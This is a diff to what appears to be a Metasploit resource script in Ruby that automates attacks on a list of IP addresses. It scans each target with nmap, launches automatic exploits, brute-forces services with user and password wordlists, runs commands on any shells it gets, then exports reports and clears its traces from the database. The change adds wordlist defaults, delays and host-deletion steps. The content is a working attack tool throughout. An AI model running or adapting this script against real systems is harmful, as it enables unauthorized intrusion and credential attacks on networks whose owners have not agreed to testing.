@@ -9,6 +9,7 @@ path='/root/IPs.txt'
 remains=''
 line=''
 each=''
+before=''
 
 # Function to get users input on Metasploit
 def getline()
@@ -145,15 +146,21 @@ print_line("It defaults to #{pathdefault}{unix_users.txt,unix_passwords.txt}")
 print_line("if so, just hit ENTER, else copy these files to that directory and just pass your names here.")
 print_line("...then happy cracking!")
 print_line("Users filename:")
-user_file = getline.strip
+user_file = getline
+user_file = user_file.chomp
 print_line("Passwords filename:")
-pass_file = getline.strip
+pass_file = getline
+pass_file = pass_file.chomp
 
 if (user_file != '')
 	run_single("setg USER_FILE #{pathdefault}#{user_file}")
+else
+	run_single("setg USER_FILE #{pathdefault}unix_users.txt")
 end
 if (pass_file != '')
 	run_single("setg PASS_FILE #{pathdefault}#{pass_file}")
+else
+	run_single("setg PASS_FILE #{pathdefault}unix_passwords.txt")
 end
 
 run_single("load pentest")
@@ -163,9 +170,16 @@ File.open(path, 'r') {|file| line=file.gets; remains=file.read}
   run_single("setg RHOSTS #{line}")
   run_single("setg LHOST 192.168.0.113")
   run_single("db_nmap #{line} -sS")
+  sleep 10
   run_single("db_nmap -sU -P0 --max-retries 1 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{line}")
+  sleep 10
   run_single("discover_db -r #{line}/32")
   run_single("vuln_exploit -j 1")
+if ("#{before}" != '')
+  run_single("hosts -d #{before}")
+end
+  before="#{line}"
+
 
 # If exploits don't work, try brute force on services
 if (framework.sessions.length <= 0)
@@ -190,6 +204,7 @@ if (framework.sessions.length > 0)
 	run_single("set SESSION 1")
 	run_single("run")
 	run_single("id")
+	run_single("back")
     end
   end
 end
@@ -249,10 +264,9 @@ end
 # Generate a XML report if there are some open session
 if (framework.sessions.length > 0)
 	run_single("db_export -f xml -a /root/#{line}.xml")
-if ($?.success?)
 	bruteforce(line)
 	line="#{line}".chomp
-end
+
 # To create PDF reports, install Apache's FOP from https://xmlgraphics.apache.org/fop/download.html on /opt
 if ($?.success?)
 	run_single("xsltproc --output /root/#{line}.fo --stringparam fop1.extensions 1 /root/metasploitReportTemplate.xsl /root/#{line}.xml")
@@ -267,9 +281,12 @@ end
 # Terminate all open sessions and remove host from DB to don't contaminate next scan
 run_single("sessions -K")
 framework.db.hosts.each do |host|
-	if (host.address != nil || host.address != 0)
+if (host.address != nil || host.address != 0)
+	run_single("hosts -d")
+	while ($?.exitstatus != 0)
 		run_single("hosts -d")
 	end
+end
 end
 
 # Remove this IP from list to don't repeat it in case of script restart
